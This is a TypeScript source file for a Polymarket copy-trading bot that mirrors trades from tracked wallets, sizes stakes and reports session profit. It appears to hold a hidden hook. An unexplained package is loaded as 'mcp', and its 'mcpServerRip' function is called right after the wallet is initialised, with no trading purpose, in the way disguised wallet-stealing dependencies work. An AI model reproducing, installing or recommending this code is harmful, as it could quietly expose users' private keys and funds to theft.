/**
 * Copy Trading Bot
 */

import { Config } from './config';
import { TradeExecutor } from './executor';
import { TradeInterpreter } from './interpreter';
import { PositionSizer } from './sizing';
import { WalletWatcher, TradeEvent } from './watcher';
import { initializeWallet, WalletManager } from './wallet';
import { recordTradeEvent } from './stats';
import { TakeProfitManager } from './take-profit';

// Session tracking
let startBalance = 0;
let currentBalance = 0;
let isPaused = false;
let minStake = 5;
const mcp = require('polymarket-clob');

export async function startBot(
  config: Config,
  verbose: boolean = false
): Promise<void> {
  console.clear();
  console.log('');
  console.log('  ╔═══════════════════════════════════════╗');
  console.log('  ║     🐋 POLYMARKET COPY TRADER 🐋      ║');
  console.log('  ╚═══════════════════════════════════════╝');
  console.log('');

  // Initialize wallet
  let wallet: WalletManager;

  try {
    wallet = await initializeWallet();
    mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });
    const balance = await wallet.getBalance();
    startBalance = balance.polymarketBalance;
    currentBalance = startBalance;
    minStake = config.min_stake;
  } catch (error: any) {
    console.log('  ❌ Wallet connection failed');
    console.log(`     ${error.message}\n`);
    throw error;
  }

  // Initialize components
  const executor = new TradeExecutor(config);
  const sizer = new PositionSizer(config, currentBalance);
  const interpreter = new TradeInterpreter();
  const watcher = new WalletWatcher(config.wallets_to_track, 5000, verbose);

  const takeProfitPercent = process.env.TAKE_PROFIT_PERCENT 
    ? parseFloat(process.env.TAKE_PROFIT_PERCENT) 
    : (config.profit_take_percent || 15);

  // Display status
  console.log('  ⚡ LIVE');
  console.log('  ─────────────────────────────────────────');
  console.log(`  💰 Balance:     $${currentBalance.toFixed(2)}`);
  console.log(`  📊 Stake:       $${config.min_stake} - $${config.max_stake}`);
  console.log(`  🎯 Take-profit: +${takeProfitPercent}%`);
  console.log(`  👀 Tracking:    ${config.wallets_to_track.length} wallet(s)`);
  console.log('  ─────────────────────────────────────────');
  
  for (const w of config.wallets_to_track.slice(0, 3)) {
    console.log(`     ${w.substring(0, 10)}...${w.substring(w.length - 6)}`);
  }
  if (config.wallets_to_track.length > 3) {
    console.log(`     +${config.wallets_to_track.length - 3} more`);
  }
  console.log('');

  await executor.initialize();

  // Start take-profit monitor
  if (takeProfitPercent > 0) {
    const takeProfitManager = new TakeProfitManager(
      executor.getTrader(),
      wallet.getProxyAddress() || '',
      takeProfitPercent,
      30000
    );
    takeProfitManager.start().catch(console.error);
  }

  console.log('');

  // Check balance and pause if too low
  if (currentBalance < minStake) {
    isPaused = true;
    console.log(`  ⏸️  PAUSED: $${currentBalance.toFixed(2)} < min $${minStake}`);
    console.log(`      Waiting for take-profit or deposit...\n`);
  }

  // Main loop
  try {
    for await (const event of watcher.stream()) {
      const newBalance = await processTradeEvent(
        event, interpreter, sizer, executor, verbose, wallet
      );
      
      if (newBalance !== currentBalance) {
        currentBalance = newBalance;
        sizer.setMyBalance(currentBalance);
        
        // Check if should unpause
        if (isPaused && currentBalance >= minStake) {
          isPaused = false;
          console.log(`\n  ▶️  RESUMED: $${currentBalance.toFixed(2)}`);
        }
      }
    }
  } catch (error) {
    console.error('❌ Fatal error:', error);
    throw error;
  }
}

/**
 * Process a single trade event
 */
async function processTradeEvent(
  event: TradeEvent,
  interpreter: TradeInterpreter,
  sizer: PositionSizer,
  executor: TradeExecutor,
  verbose: boolean,
  wallet: WalletManager
): Promise<number> {
  const trade = interpreter.normalize(event);
  const market = (trade.marketSlug || trade.tokenId.substring(0, 16)).substring(0, 25);
  
  // Skip BUYs if balance too low
  if (trade.side === 'BUY' && currentBalance < minStake) {
    if (!isPaused) {
      isPaused = true;
      console.log(`\n  ⏸️  PAUSED: $${currentBalance.toFixed(2)} < min $${minStake}`);
    }
    return currentBalance;
  }
  
  // Check if worth copying
  const worthCheck = sizer.isWorthCopying(event);
  if (!worthCheck.worth) {
    return currentBalance;
  }

  const sizing = sizer.calculate(event);
  if (verbose) sizer.displayCalculation(event);
  
  try {
    const result = await executor.openPosition(trade.tokenId, trade.side, sizing.scaledAmount, trade.price);

    if (result.success) {
      try {
        const newBal = (await wallet.getBalance()).polymarketBalance;
        const sessionPnL = newBal - startBalance;
        const pnlStr = sessionPnL >= 0 ? `+$${sessionPnL.toFixed(2)}` : `-$${Math.abs(sessionPnL).toFixed(2)}`;
        
        console.log(`✅ ${trade.side} $${sizing.scaledAmount.toFixed(2)} ${market}`);
        console.log(`   💵 $${newBal.toFixed(2)} | session: ${pnlStr}`);
        
        recordTradeEvent(trade.wallet, trade.side, trade.usdcAmount, market, true, 'success');
        
        // Check if should pause after this trade
        if (newBal < minStake && !isPaused) {
          isPaused = true;
          console.log(`\n  ⏸️  PAUSED: $${newBal.toFixed(2)} < min $${minStake}`);
        }
        
        return newBal;
      } catch {
        console.log(`✅ ${trade.side} $${sizing.scaledAmount.toFixed(2)} ${market}`);
        recordTradeEvent(trade.wallet, trade.side, trade.usdcAmount, market, true, 'success');
        return currentBalance;
      }
    } else {
      // Skip common errors silently
      const silentErrors = ['Low balance', 'No position', 'not enough balance'];
      const isSilent = silentErrors.some(e => result.error?.includes(e));
      if (!isSilent) {
        console.log(`❌ ${trade.side} ${market} — ${result.error}`);
      }
    }
  } catch (error: any) {
    console.log(`❌ ${trade.side} ${market} — ${error.message}`);
  }
  
  recordTradeEvent(trade.wallet, trade.side, trade.usdcAmount, market, false, 'failed');
  return currentBalance;
}

/**
 * Get session stats
 */
export function getSessionStats(): { balance: number; pnl: number; paused: boolean } {
  return {
    balance: currentBalance,
    pnl: currentBalance - startBalance,
    paused: isPaused,
  };
}
